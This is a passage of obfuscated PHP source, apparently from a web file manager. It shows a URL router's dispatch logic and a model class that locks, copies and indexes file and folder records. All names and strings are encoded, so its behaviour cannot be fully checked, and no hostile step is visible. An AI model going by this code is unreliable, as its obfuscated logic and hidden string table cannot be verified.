$³µÉµ‡[8] . $ô¡Ò®Œ«[1]; $ùä‰ÅÌÓ = $ô¡Ò®Œ«[2]; } else { $¹È¼‹±… = null; $‹†šĞµ» = strpos($ô¡Ò®Œ«[0], $³µÉµ‡[8]) === 0 ? $ô¡Ò®Œ«[0] : $³µÉµ‡[8] . $ô¡Ò®Œ«[0]; $ùä‰ÅÌÓ = $ô¡Ò®Œ«[1]; } array_push(self::$maps, $¹È¼‹±…); array_push(self::$routes, $‹†šĞµ»); array_push(self::$methods, strtoupper($æ†¬¿Å»)); array_push(self::$callbacks, $ùä‰ÅÌÓ); } public static function error($šå¨Ş´à) { self::$errorCallback = $šå¨Ş´à; } public static function haltOnMatch($ŞğÉ›®å = true) { self::$halts = $ŞğÉ›®å; } public static function dispatch() { $ŠœºïÍø =& $_SERVER[öæÛ¿©¿]; $·Ûå–Ñ = parse_url($_SERVER[$ŠœºïÍø[1863]], PHP_URL_PATH); $‘Üª‘Ò = $_SERVER[$ŠœºïÍø[162]]; $ñ­õˆ” = array_keys(static::$patterns); $¡™®¼¿Ğ = array_values(static::$patterns); $’ÂÇ‘ì = !1; self::$routes = preg_replace($ŠœºïÍø[1411], $ŠœºïÍø[8], self::$routes); if (in_array($·Ûå–Ñ, self::$routes)) { $†¨„ßãÃ = array_keys(self::$routes, $·Ûå–Ñ); foreach ($†¨„ßãÃ as $Š‚¥¦Šå) { if (self::$methods[$Š‚¥¦Šå] == $‘Üª‘Ò || self::$methods[$Š‚¥¦Šå] == $ŠœºïÍø[1864] || in_array($‘Üª‘Ò, self::$maps[$Š‚¥¦Šå])) { $’ÂÇ‘ì = !0; if (!is_object(self::$callbacks[$Š‚¥¦Šå])) { $¡›…íƒ = explode($ŠœºïÍø[8], self::$callbacks[$Š‚¥¦Šå]); $ ÇÏ•´¿ = end($¡›…íƒ); $î˜É¹ØÎ = explode($ŠœºïÍø[1341], $ ÇÏ•´¿); $°éç™Å÷ = new $î˜É¹ØÎ[0](); $°éç™Å÷->{$î˜É¹ØÎ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Š‚¥¦Šå]); if (self::$halts) { return; } } } } } else { $–÷„¼«° = 0; foreach (self::$routes as $Š‚¥¦Šå) { if (strpos($Š‚¥¦Šå, $ŠœºïÍø[4]) !== !1) { $Š‚¥¦Šå = str_replace($ñ­õˆ”, $¡™®¼¿Ğ, $Š‚¥¦Šå); } if (preg_match($ŠœºïÍø[1865] . $Š‚¥¦Šå . $ŠœºïÍø[1866], $·Ûå–Ñ, $ä–°÷Ÿû)) { if (self::$methods[$–÷„¼«°] == $‘Üª‘Ò || self::$methods[$–÷„¼«°] == $ŠœºïÍø[1864] || !empty(self::$maps[$–÷„¼«°]) && in_array($‘Üª‘Ò, self::$maps[$–÷„¼«°])) { $’ÂÇ‘ì = !0; array_shift($ä–°÷Ÿû); if (!is_object(self::$callbacks[$–÷„¼«°])) { $¡›…íƒ = explode($ŠœºïÍø[8], self::$callbacks[$–÷„¼«°]); $ ÇÏ•´¿ = end($¡›…íƒ); $î˜É¹ØÎ = explode($ŠœºïÍø[1341], $ ÇÏ•´¿); $°éç™Å÷ = new $î˜É¹ØÎ[0](); if (!method_exists($°éç™Å÷, $î˜É¹ØÎ[1])) { echo $ŠœºïÍø[1867]; } else { call_user_func_array(array($°éç™Å÷, $î˜É¹ØÎ[1]), $ä–°÷Ÿû); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$–÷„¼«°], $ä–°÷Ÿû); if (self::$halts) { return; } } } } $–÷„¼«°++; } } if ($’ÂÇ‘ì == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $æÈ£¤İÉ =& $_SERVER[öæÛ¿©¿]; header($_SERVER[$æÈ£¤İÉ[1868]] . $æÈ£¤İÉ[1869]); echo $æÈ£¤İÉ[1870]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ŠœºïÍø[1863]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto FÎòÉÊƒ¦; eÙƒëî’×: define($_SERVER[öæÛ¿©¿][318], 3); define($_SERVER[öæÛ¿©¿][319], 1); define($_SERVER[öæÛ¿©¿][320], 0); goto bßİâª‡¦·; d‘ÃŞÎÁéê: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÑÉ ëØÃ) { $”§úì¸º =& $_SERVER[öæÛ¿©¿]; if (!$this->allowLock()) { return; } $this->_lockCheck($”§úì¸º[637], $ÑÉ ëØÃ); $µİ®œ¨ = 1; $this->_lockEvent($ÑÉ ëØÃ, array($”§úì¸º[638], $”§úì¸º[639]), $µİ®œ¨); $this->_lockParent($ÑÉ ëØÃ, array($”§úì¸º[639]), $µİ®œ¨); $this->_lockEvent($ÑÉ ëØÃ, array($”§úì¸º[640], $”§úì¸º[641]), $µİ®œ¨); $this->_lockCheckEnd($”§úì¸º[637], $ÑÉ ëØÃ); } public function lockCopyEnd($³Óø¬†ã) { $ÊõİñÈ€ =& $_SERVER[öæÛ¿©¿]; if (!$this->allowLock()) { return; } $”Àœç»« = 0; $this->_lockEvent($³Óø¬†ã, array($ÊõİñÈ€[638], $ÊõİñÈ€[639]), $”Àœç»«); $this->_lockParent($³Óø¬†ã, array($ÊõİñÈ€[639]), $”Àœç»«); $this->_lockEvent($³Óø¬†ã, array($ÊõİñÈ€[640], $ÊõİñÈ€[641]), $”Àœç»«); } public function lockWriteStart($Ó‘¥‡Ï, $íëÆÄ¥ = '') { $Ã…„İ› =& $_SERVER[öæÛ¿©¿]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ã…„İ›[638], $Ó‘¥‡Ï); $ì¤øªë = 1; $this->_lockKey($Ã…„İ›[642] . $Ó‘¥‡Ï . $Ã…„İ›[10] . $íëÆÄ¥, $ì¤øªë); $this->_lockEvent($Ó‘¥‡Ï, array($Ã…„İ›[637], $Ã…„İ›[639]), $ì¤øªë); $this->_lockParent($Ó‘¥‡Ï, array($Ã…„İ›[637], $Ã…„İ›[639]), $ì¤øªë); $this->_lockCheckEnd($Ã…„İ›[638], $Ó‘¥‡Ï); } public function lockWriteEnd($ç²¥®Úå, $Ê³ÚÊšû = '') { $¤í…úÛ· =& $_SERVER[öæÛ¿©¿]; if (!$this->allowLock()) { return; } $”„‡Öš‘ = 0; $this->_lockKey($¤í…úÛ·[642] . $ç²¥®Úå . $¤í…úÛ·[10] . $Ê³ÚÊšû, $”„‡Öš‘); $this->_lockEvent($ç²¥®Úå, array($¤í…úÛ·[637], $¤í…úÛ·[639]), $”„‡Öš‘); $this->_lockParent($ç²¥®Úå, array($¤í…úÛ·[637], $¤í…úÛ·[639]), $”„‡Öš‘); } public function lockMoveStart($¡Ö‰è®Ú) { $Ê·À‡ë¿ =& $_SERVER[öæÛ¿©¿]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ê·À‡ë¿[639], $¡Ö‰è®Ú); $ğ‡ÕôÆ = 1; $this->_lockKey($Ê·À‡ë¿[643] . $¡Ö‰è®Ú, $ğ‡ÕôÆ); $this->_lockEvent($¡Ö‰è®Ú, array($Ê·À‡ë¿[637], $Ê·À‡ë¿[638]), $ğ‡ÕôÆ); $this->_lockParent($¡Ö‰è®Ú, array($Ê·À‡ë¿[637], $Ê·À‡ë¿[639]), $ğ‡ÕôÆ); $this->_lockEvent($¡Ö‰è®Ú, array($Ê·À‡ë¿[644], $Ê·À‡ë¿[640], $Ê·À‡ë¿[641]), $ğ‡ÕôÆ); $this->_lockCheckEnd($Ê·À‡ë¿[639], $¡Ö‰è®Ú); } public function lockMoveEnd($˜¥ú–) { $€ä°¬ç =& $_SERVER[öæÛ¿©¿]; if (!$this->allowLock()) { return; } $¬œ»ÃÏè = 0; $this->_lockKey($€ä°¬ç[643] . $˜¥ú–, $¬œ»ÃÏè); $this->_lockEvent($˜¥ú–, array($€ä°¬ç[637], $€ä°¬ç[638]), $¬œ»ÃÏè); $this->_lockParent($˜¥ú–, array($€ä°¬ç[637], $€ä°¬ç[639]), $¬œ»ÃÏè); $this->_lockEvent($˜¥ú–, array($€ä°¬ç[644], $€ä°¬ç[640], $€ä°¬ç[641]), $¬œ»ÃÏè); } private function _lockCheck($‘¡¡éé, $Ó›ıº˜) { $šö°÷ºõ =& $_SERVER[öæÛ¿©¿]; $¸ƒ¶²Áı = $this->sourceInfo($Ó›ıº˜); $Şßû·ÖÖ = $‘¡¡éé . $šö°÷ºõ[10] . $Ó›ıº˜; $this->_lockTimeStart[$Şßû·ÖÖ] = timeFloat(); if (!is_array($¸ƒ¶²Áı)) { return; } $–ÏöÜ°´ = LNG($šö°÷ºõ[645]); CacheLock::setErrorMsg($šö°÷ºõ[174] . htmlspecialchars($¸ƒ¶²Áı[$šö°÷ºõ[32]]) . $šö°÷ºõ[176] . $–ÏöÜ°´); $this->_lockKey($Şßû·ÖÖ, 1); $this->_lockKey($Şßû·ÖÖ, 0); $‹—¶Õü = array_reverse($this->parentLevelArray($¸ƒ¶²Áı[$šö°÷ºõ[600]])); foreach ($‹—¶Õü as $®È™«Ä) { $Şßû·ÖÖ = $‘¡¡éé . $šö°÷ºõ[646] . $®È™«Ä; if (CacheLock::lockGet($šö°÷ºõ[647] . $Şßû·ÖÖ)) { $¸ƒ¶²Áı = $this->sourceInfo($®È™«Ä); CacheLock::setErrorMsg($šö°÷ºõ[174] . htmlspecialchars($¸ƒ¶²Áı[$šö°÷ºõ[32]]) . $šö°÷ºõ[176] . $–ÏöÜ°´); $this->_lockKey($Şßû·ÖÖ, 1); $this->_lockKey($Şßû·ÖÖ, 0); } } } private function _lockCheckEnd($­¾ë’Í˜, $Áø‚Ûò°) { $Ì–èÏµ¯ =& $_SERVER[öæÛ¿©¿]; $“´ıé­İ = $­¾ë’Í˜ . $Ì–èÏµ¯[10] . $Áø‚Ûò°; CacheLock::setErrorMsg($Ì–èÏµ¯[463]); if (!isset($this->_lockTimeStart[$“´ıé­İ])) { return; } $´‰Ïèİ– = timeFloat() - $this->_lockTimeStart[$“´ıé­İ]; unset($this->_lockTimeStart[$“´ıé­İ]); if ($´‰Ïèİ– > 0.5) { unset(self::$cacheSourceInfo[$Ì–èÏµ¯[543] . $Áø‚Ûò°]); } $üç¹›°® = $this->sourceInfo($Áø‚Ûò°); if (!$üç¹›°®) { show_json(LNG($Ì–èÏµ¯[106]), !1); } } private function _lockParent($ã½Ââ¡©, $•§ »˜‹, $œ¥éëŠ) { if (!$this->autoLockSet) { return; } $ÜÅı”ó  = $this->sourceInfo($ã½Ââ¡©); if (!is_array($ÜÅı”ó )) { return; } $±²öÎÚ¿ = array_reverse($this->parentLevelArray($ÜÅı”ó [$_SERVER[öæÛ¿©¿][600]])); foreach ($±²öÎÚ¿ as $ÜìÆæä¢) { $this->_lockEvent($ÜìÆæä¢, $•§ »˜‹, $œ¥éëŠ); } } private function _lockEvent($†§øİÂ­, $»÷»†À„, $ß‘…é½ä) { $úÏùº¡Õ =& $_SERVER[öæÛ¿©¿]; if (!$this->autoLockSet) { return; } foreach ($»÷»†À„ as $¦Î¹Üñ) { $úÍ‹èş = $¦Î¹Üñ . $úÏùº¡Õ[10] . $†§øİÂ­; if ($ß‘…é½ä && CacheLock::lockGet($úÏùº¡Õ[647] . $úÍ‹èş)) { continue; } $this->_lockKey($úÍ‹èş, $ß‘…é½ä); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ù÷ò½Ø, $àçÊ™ëª = 1) { $Úš‰Åšì = $_SERVER[öæÛ¿©¿][647] . md5($Ù÷ò½Ø); if ($àçÊ™ëª) { if (isset(self::$_lockItemArr[$Úš‰Åšì])) { return; } self::$_lockItemArr[$Úš‰Åšì] = 1; CacheLock::lock($Úš‰Åšì, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Úš‰Åšì])) { return; } unset(self::$_lockItemArr[$Úš‰Åšì]); CacheLock::unlock($Úš‰Åšì); } } public function isParentOf($¼òÓ‡¸¥, $ €¬ù»õ) { $Å´Øšª =& $_SERVER[öæÛ¿©¿]; $©ãƒúÔÒ = $this->sourceInfo($¼òÓ‡¸¥); $œ¶ı«Ø = $this->sourceInfo($ €¬ù»õ); $¥êøĞ‘õ = $©ãƒúÔÒ[$Å´Øšª[600]] . $©ãƒúÔÒ[$Å´Øšª[192]] . $Å´Øšª[50]; $ŒŞùøÃ¤ = $œ¶ı«Ø[$Å´Øšª[600]] . $œ¶ı«Ø[$Å´Øšª[192]] . $Å´Øšª[50]; $«šãøíğ = strpos($ŒŞùøÃ¤, $¥êøĞ‘õ) === 0; return $«šãøíğ; } private $targetIsDelete = 0; public function copy($™±îáãÔ, $é©Ùı€, $ß‡íáù¸ = REPEAT_REPLACE, $íøÍ’Ä› = '') { $ßúí‹½ =& $_SERVER[öæÛ¿©¿]; $¬ÖºÙÛ‹ = $this->sourceInfo($™±îáãÔ); $œñş¼”ä = $this->sourceInfo($é©Ùı€); if (!$¬ÖºÙÛ‹ || !$œñş¼”ä || $œñş¼”ä[$ßúí‹½[496]] != $ßúí‹½[91]) { return !1; } if ($this->isParentOf($™±îáãÔ, $é©Ùı€)) { return !1; } $¹ıİ¤ëÙ = $íøÍ’Ä› ? $íøÍ’Ä› : $¬ÖºÙÛ‹[$ßúí‹½[32]]; $this->lockCopyStart($™±îáãÔ); $this->lockWriteStart($é©Ùı€, $¹ıİ¤ëÙ); $Ëõè¡¿Ş = array($ßúí‹½[648] => array(), $ßúí‹½[649] => array(), $ßúí‹½[650] => array()); $this->targetIsDelete = intval($¬ÖºÙÛ‹[$ßúí‹½[516]]); $„èÕ¨Ã• = $this->fileNameExistAuto($é©Ùı€, $¬ÖºÙÛ‹); $”÷Ïì³í = $this->_copy($™±îáãÔ, $é©Ùı€, $ß‡íáù¸, $Ëõè¡¿Ş, !0, $íøÍ’Ä›); $this->_childrenListClear(); $this->lockCopyEnd($™±îáãÔ); $this->lockWriteEnd($é©Ùı€, $¹ıİ¤ëÙ); if ($¬ÖºÙÛ‹[$ßúí‹½[496]] == $ßúí‹½[91] && $„èÕ¨Ã• == $”÷Ïì³í) { $this->folderSizeResetChildren($„èÕ¨Ã•); } Model($ßúí‹½[651])->addAll($Ëõè¡¿Ş[$ßúí‹½[649]], array(), !0); if ($„èÕ¨Ã• != $”÷Ïì³í || $¬ÖºÙÛ‹[$ßúí‹½[496]] == $ßúí‹½[91]) { Model($ßúí‹½[652])->eventCopy($”÷Ïì³í); } $this->saveAll($Ëõè¡¿Ş[$ßúí‹½[650]]); Model($ßúí‹½[231])->linkAdd($Ëõè¡¿Ş[$ßúí‹½[648]]); $this->folderSizeReset($é©Ùı€); $this->updateModifyTime($é©Ùı€); return $”÷Ïì³í; } private function _copy($•´¿¬–„, $àÍ»ú³ø, $ÕÌšşŸü, &$ÓáŸšÍ, $ê¥õœÛÂ, $»˜çôÓ = '') { $ß¢ ì¿¸ =& $_SERVER[öæÛ¿©¿]; $®©úÈŠÊ = $this->sourceInfoCache($•´¿¬–„); $û´ïô¿Ç = $®©úÈŠÊ[$ß¢ ì¿¸[496]] == $ß¢ ì¿¸[91]; $ ‚Ìôá® = $»˜çôÓ ? $»˜çôÓ : $®©úÈŠÊ[$ß¢ ì¿¸[32]]; $Òö÷ôûÌ = $this->fileNameExistAuto($àÍ»ú³ø, $®©úÈŠÊ); if ($ê¥õœÛÂ) { $this->_childrenAllMake($•´¿¬–„); if ($û´ïô¿Ç && $Òö÷ôûÌ) { $this->_childrenAllMake($Òö÷ôûÌ); } } if (!$Òö÷ôûÌ) { return $this->_copyCreate($•´¿¬–„, $àÍ»ú³ø, $ ‚Ìôá®, $ÓáŸšÍ); } $ÖŸï…€Ï = $Òö÷ôûÌ; if ($û´ïô¿Ç) { if ($ÕÌšşŸü == REPEAT_RENAME_FOLDER) { $ ‚Ìôá® = $this->fileNameAutoCache($àÍ»ú³ø, $ ‚Ìôá®, $ÕÌšşŸü, $û´ïô¿Ç); $ÖŸï…€Ï = $this->_copyCreate($•´¿¬–„, $àÍ»ú³ø, $ ‚Ìôá®, $ÓáŸšÍ); } else { $•İúè³ = $this->_childrenList($•´¿¬–„); foreach ($•İúè³ as $°Ô ¾€) { $this->_copy($°Ô ¾€[$ß¢ ì¿¸[192]], $Òö÷ôûÌ, $ÕÌšşŸü, $ÓáŸšÍ, !1); } } } else { if ($ÕÌšşŸü == REPEAT_RENAME || $ÕÌšşŸü == REPEAT_RENAME_FOLDER) { $ ‚Ìôá® = $this->fileNameAutoCache($àÍ»ú³ø, $ ‚Ìôá®, $ÕÌšşŸü, $û´ïô¿Ç); $ÖŸï…€Ï = $this->_copyCreate($•´¿¬–„, $àÍ»ú³ø, $ ‚Ìôá®, $ÓáŸšÍ); } else { if ($ÕÌšşŸü == REPEAT_REPLACE) { $ïş¿÷—õ = $this->sourceInfoCache($Òö÷ôûÌ); $×®ş‘•å = $this->fileHistory($ïş¿÷—õ, $®©úÈŠÊ[$ß¢ ì¿¸[553]], $®©úÈŠÊ[$ß¢ ì¿¸[79]]); if ($×®ş‘•å) { $ÓáŸšÍ[$ß¢ ì¿¸[648]][] = $®©úÈŠÊ[$ß¢ ì¿¸[553]]; } } else { if ($ÕÌšşŸü == REPEAT_SKIP) { } } } Hook::trigger($ß¢ ì¿¸[653], array($ß¢ ì¿¸[654], $®©úÈŠÊ, 0)); } return $ÖŸï…€Ï; } private function _copyCreate($ÄÂªŸ¼Ç, $šƒ¡…ª, $¦òâ¥©Ù, &$œ®—„¡½) { $“­æ‘¿ =& $_SERVER[öæÛ¿©¿]; $œò±Ş˜Ñ = $this->sourceInfoCache($ÄÂªŸ¼Ç); $Â­ÌëßÊ = $this->sourceInfoCache($šƒ¡…ª); $Ì¡Ï™˜Š = $this->_makeItemData($œò±Ş˜Ñ, $Â­ÌëßÊ, $¦òâ¥©Ù); Hook::trigger($“­æ‘¿[655], $Ì¡Ï™˜Š); Hook::trigger($“­æ‘¿[656], array($“­æ‘¿[657], $Ì¡Ï™˜Š, 0)); $©Éæ©›ª = $this->add($Ì¡Ï™˜Š); $œÉ®ª¤¡ = array($“­æ‘¿[192] => $©Éæ©›ª, $“­æ‘¿[32] => $¦òâ¥©Ù); $this->_copyApplyMeta($œÉ®ª¤¡, $œ®—„¡½); if ($œò±Ş˜Ñ[$“­æ‘¿[496]] != $“­æ‘¿[91]) { $œ®—„¡½[$“­æ‘¿[648]][] = $œò±Ş˜Ñ[$“­æ‘¿[553]]; return $©Éæ©›ª; } $ûøØ¾åª = array(); $øêµ“é… = array(); $this->_childrenListAll($ÄÂªŸ¼Ç, $ûøØ¾åª); $‡ÒÒ®Ù† = count($ûøØ¾åª); if ($‡ÒÒ®Ù† == 0) { return $©Éæ©›ª; } $û†¼ú°Ã = $this->sourceInfo($©Éæ©›ª); foreach ($ûøØ¾åª as $ª¿Ø°•Ú) { $œÅŸÃ¤â = $this->_makeItemData($ª¿Ø°•Ú, $û†¼ú°Ã, $ª¿Ø°•Ú[$“­æ‘¿[32]]); $œÅŸÃ¤â[$“­æ‘¿[600]] = $ª¿Ø°•Ú[$“­æ‘¿[600]]; $øêµ“é…[] = $œÅŸÃ¤â; } $this->chunkEventSet($“­æ‘¿[658], array($“­æ‘¿[659], $Ì¡Ï™˜Š, $‡ÒÒ®Ù†)); $this->addAll($øêµ“é…, array(), !1); $Ô—ÌÙÅÓ = $this->where(array($“­æ‘¿[191] => $©Éæ©›ª))->select(); $ƒ”¼Œ›Š = $this->_childrenMakeRelation($ûøØ¾åª, $Ô—ÌÙÅÓ); $ƒ”¼Œ›Š[$ÄÂªŸ¼Ç] = $©Éæ©›ª; $É†àïã´ = array(); $ßÖ–¢ç– = array(); foreach ($Ô—ÌÙÅÓ as $ª¿Ø°•Ú) { $¼µ¿—ÃÈ = $ª¿Ø°•Ú[$“­æ‘¿[192]]; $¬äÑ“Ÿ´ = $this->_childrenMatch($ƒ”¼Œ›Š, $ª¿Ø°•Ú, $û†¼ú°Ã); $É†àïã´[] = array($“­æ‘¿[192], $¼µ¿—ÃÈ, $“­æ‘¿[191], $¬äÑ“Ÿ´[$“­æ‘¿[191]]); $ßÖ–¢ç–[] = array($“­æ‘¿[192], $¼µ¿—ÃÈ, $“­æ‘¿[600], $¬äÑ“Ÿ´[$“­æ‘¿[600]]); $this->_copyApplyMeta($ª¿Ø°•Ú, $œ®—„¡½); if ($ª¿Ø°•Ú[$“­æ‘¿[496]] != $“­æ‘¿[91]) { $œ®—„¡½[$“­æ‘¿[648]][] = $ª¿Ø°•Ú[$“­æ‘¿[553]]; } } $this->chunkEventSet($“­æ‘¿[660], array($“­æ‘¿[661], $Ì¡Ï™˜Š, $‡ÒÒ®Ù†)); $this->saveAll($É†àïã´); $this->chunkEventSet($“­æ‘¿[662], array($“­æ‘¿[663], $Ì¡Ï™˜Š, $‡ÒÒ®Ù†)); $this->saveAll($ßÖ–¢ç–); return $©Éæ©›ª; } private function _childrenMakeRelation($šÏ¿é¤¼, $«¡Õ¯è‹) { $ˆ¥œ²Óú =& $_SERVER[öæÛ¿©¿]; $ıƒåÕÉÄ = array(); $ü’¨Â¦ = array(); foreach ($šÏ¿é¤¼ as $ôØÕÊÅ—) { $Ë’¾°ĞÕ = $ôØÕÊÅ—[$ˆ¥œ²Óú[32]] . $ˆ¥œ²Óú[8] . $ôØÕÊÅ—[$ˆ¥œ²Óú[600]]; $ıƒåÕÉÄ[$Ë’¾°ĞÕ] = $ôØÕÊÅ—[$ˆ¥œ²Óú[192]]; } foreach ($«¡Õ¯è‹ as $ôØÕÊÅ—) { $Ë’¾°ĞÕ = $ôØÕÊÅ—[$ˆ¥œ²Óú[32]] . $ˆ¥œ²Óú[8] . $ôØÕÊÅ—[$ˆ¥œ²Óú[600]]; $ö¿ï“‚’ = $ıƒåÕÉÄ[$Ë’¾°ĞÕ]; $ü’¨Â¦[$ö¿ï“‚’] = $ôØÕÊÅ—[$ˆ¥œ²Óú[192]]; } return $ü’¨Â¦; } private function _childrenMatch($×§õé, $ÎğÑÏÈ°, $ªÖÊ®Å) { $ªŞæí¯ =& $_SERVER[öæÛ¿©¿]; $¾¶£÷œ© = $ªÖÊ®Å[$ªŞæí¯[600]]; $…¡¨¿ÂÀ = $this->parentLevelArray($ÎğÑÏÈ°[$ªŞæí¯[600]]); foreach ($…¡¨¿ÂÀ as $çãßêéÇ) { if (isset($×§õé[$çãßêéÇ])) { $¾¶£÷œ© .= $×§õé[$çãßêéÇ] . $ªŞæí¯[664]; } } $¾¶£÷œ© = rtrim($¾¶£÷œ©, $ªŞæí¯[50]) . $ªŞæí¯[50]; $Û•Ñ‹™½ = $this->parentLevelArray($¾¶£÷œ©); $ö¤·¾Ù» = $Û•Ñ‹™½[count($Û•Ñ‹™½) - 1]; return array($ªŞæí¯[191] => $ö¤·¾Ù», $ªŞæí¯[600] => $¾¶£÷œ©); } private function _makeItemData($ë¼»¶£, $ë–êˆİï, $½çš±Øç) { $‰ËĞÅöË =& $_SERVER[öæÛ¿©¿]; $ÇÙ—â‚Ç = array($‰ËĞÅöË[665] => $ë¼»¶£[$‰ËĞÅöË[496]], $‰ËĞÅöË[505] => $½çš±Øç, $‰ËĞÅöË[666] => $ë¼»¶£[$‰ËĞÅöË[497]] ? $ë¼»¶£[$‰ËĞÅöË[497]] : $‰ËĞÅöË[12], $‰ËĞÅöË[554] => $ë¼»¶£[$‰ËĞÅöË[553]] ? $ë¼»¶£[$‰ËĞÅöË[553]] : 0, $‰ËĞÅöË[636] => $ë¼»¶£[$‰ËĞÅöË[79]] ? $ë¼»¶£[$‰ËĞÅöË[79]] : 0, $‰ËĞÅöË[667] => intval($ë–êˆİï[$‰ËĞÅöË[189]]), $‰ËĞÅöË[668] => intval($ë–êˆİï[$‰ËĞÅöË[585]]), $‰ËĞÅöË[669] => intval(USER_ID), $‰ËĞÅöË[670] => intval(USER_ID), $‰ËĞÅöË[488] => intval($ë–êˆİï[$‰ËĞÅöË[192]]), $‰ËĞÅöË[671] => $ë–êˆİï[$‰ËĞÅöË[600]] . $ë–êˆİï[$‰ËĞÅöË[192]] . $‰ËĞÅöË[50], $‰ËĞÅöË[509] => $ë¼»¶£[$‰ËĞÅöË[88]] ? $ë¼»¶£[$‰ËĞÅöË[88]] : time(), $‰ËĞÅöË[515] => 0, $‰ËĞÅöË[672] => $‰ËĞÅöË[12]); return $ÇÙ—â‚Ç; } private function _copyApplyMeta($ÊÈØŸş¶, &$ÎÌÅö©) { $çæÅèÖ§ =& $_SERVER[öæÛ¿©¿]; $Ï·ˆ‰Á¢ = $ÊÈØŸş¶[$çæÅèÖ§[192]]; $ëò®ŸÏÖ = $ÊÈØŸş¶[$çæÅèÖ§[32]]; if (!isset($ÊÈØŸş¶[$çæÅèÖ§[673]]) || !$ÊÈØŸş¶[$çæÅèÖ§[673]] || $ÊÈØŸş¶[$çæÅèÖ§[673]] == $çæÅèÖ§[229]) { $ÎÌÅö©[$çæÅèÖ§[650]][] = array($çæÅèÖ§[192], $Ï·ˆ‰Á¢, $çæÅèÖ§[673], short_id($Ï·ˆ‰Á¢)); } if (Input::check($ëò®ŸÏÖ, $çæÅèÖ§[674])) { $ÎÌÅö©[$çæÅèÖ§[649]][] = array($çæÅèÖ§[192] => $Ï·ˆ‰Á¢, $çæÅèÖ§[95] => $çæÅèÖ§[548], $çæÅèÖ§[451] => str_replace($çæÅèÖ§[53], $çæÅèÖ§[12], Pinyin::get($ëò®ŸÏÖ))); $ÎÌÅö©[$çæÅèÖ§[649]][] = array($çæÅèÖ§[192] => $Ï·ˆ‰Á¢, $çæÅèÖ§[95] => $çæÅèÖ§[547], $çæÅèÖ§[451] => Pinyin::get($ëò®ŸÏÖ, $çæÅèÖ§[675])); } $ÎÌÅö©[$çæÅèÖ§[649]][] = array($çæÅèÖ§[192] => $Ï·ˆ‰Á¢, $çæÅèÖ§[95] => $çæÅèÖ§[527], $çæÅèÖ§[451] => KodSort::makeStr($ëò®ŸÏÖ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ü¶¿¼Æ¬) { $ÖÜŠØæô =& $_SERVER[öæÛ¿©¿]; $Ì•Ééøı = $this->sourceInfo($Ü¶¿¼Æ¬); $£ú÷ ÛÈ = $ÖÜŠØæô[676]; $“èïÄ¦ = array($ÖÜŠØæô[600] => array($ÖÜŠØæô[631], $Ì•Ééøı[$ÖÜŠØæô[600]] . $Ü¶¿¼Æ¬ . $ÖÜŠØæô[632]), $ÖÜŠØæô[516] => $this->targetIsDelete); $¢Ú–îÁ˜ = $this->field($£ú÷ ÛÈ)->where($“èïÄ¦)->select(); if (!$¢Ú–îÁ˜) { return; } $¢Ú–îÁ˜ = array_to_keyvalue($¢Ú–îÁ˜, $ÖÜŠØæô[192]); foreach ($¢Ú–îÁ˜ as $À‘ù²Ğß) { $­¤¢’ó = $À‘ù²Ğß[$ÖÜŠØæô[191]]; $Ü¶¿¼Æ¬ = $À‘ù²Ğß[$ÖÜŠØæô[192]]; if (!isset($this->_childrenListCache[$Ü¶¿¼Æ¬]) && $À‘ù²Ğß[$ÖÜŠØæô[496]] == $ÖÜŠØæô[91]) { $this->_childrenListCache[$Ü¶¿¼Æ¬] = array(); } if (!isset($this->_childrenListCache[$­¤¢’ó])) { $this->_childrenListCache[$­¤¢’ó] = array(); } $this->_childrenListCache[$­¤¢’ó][$Ü¶¿¼Æ¬] = $À‘ù²Ğß; $this->_childrenItemCache[$Ü¶¿¼Æ¬] = $À‘ù²Ğß; } } private function _childrenListAll($Ú¿ĞŒ³÷, &$Üê÷ø…¬) { $Ø¹ãä” =& $_SERVER[öæÛ¿©¿]; if (!isset($this->_childrenListCache[$Ú¿ĞŒ³÷])) { return; } $¯ÂºÒÏ× = $this->_childrenListCache[$Ú¿ĞŒ³÷]; foreach ($¯ÂºÒÏ× as $ÌÇ’ÙÌ => $¾½ĞäÈû) { $Üê÷ø…¬[$ÌÇ’ÙÌ] = $¾½ĞäÈû; if ($¾½ĞäÈû[$Ø¹ãä”[496]] == $Ø¹ãä”[91]) { $this->_childrenListAll($ÌÇ’ÙÌ, $Üê÷ø…¬); } } } private function sourceInfoCache($şéç±ÖÖ) { if (isset($this->_childrenItemCache[$şéç±ÖÖ])) { return $this->_childrenItemCache[$şéç±ÖÖ]; } return $this->sourceInfo($şéç±ÖÖ); } private function _childrenList($¦éÆ‡¨) { if (isset($this->_childrenListCache[$¦éÆ‡¨])) { return $this->_childrenListCache[$¦éÆ‡¨]; } return $this->_childrenListSelect($¦éÆ‡¨); } private function _childrenListSelect($Û—é§Øã) { $ş‡şŒ©ê =& $_SERVER[öæÛ¿©¿]; $‚øüóÍŸ = array($ş‡şŒ©ê[191] => $Û—é§Øã, $ş‡şŒ©ê[516] => $this->targetIsDelete); $’º¤Ÿ±÷ = $this->where($‚øüóÍŸ)->select(); $’º¤Ÿ±÷ = $’º¤Ÿ±÷ ? $’º¤Ÿ±÷ : array(); $§Øºíİ² = array_to_keyvalue($’º¤Ÿ±÷, $ş‡şŒ©ê[192]); $this->_childrenListCache[$Û—é§Øã] = $§Øºíİ²; foreach ($§Øºíİ² as $Û—é§Øã => $‘‡Ø—ı¦) { $this->_childrenItemCache[$Û—é§Øã] = $‘‡Ø—ı¦; } return $§Øºíİ²; } private function fileNameExistAuto($ÖÚé•¯, $„î»ßº) { $ê×Ãßİ™ =& $_SERVER[öæÛ¿©¿]; if ($„î»ßº[$ê×Ãßİ™[516]] == $ê×Ãßİ™[91]) { return $this->fileNameExist($ÖÚé•¯, $„î»ßº[$ê×Ãßİ™[32]]); } return $this->fileNameExistCache($ÖÚé•¯, 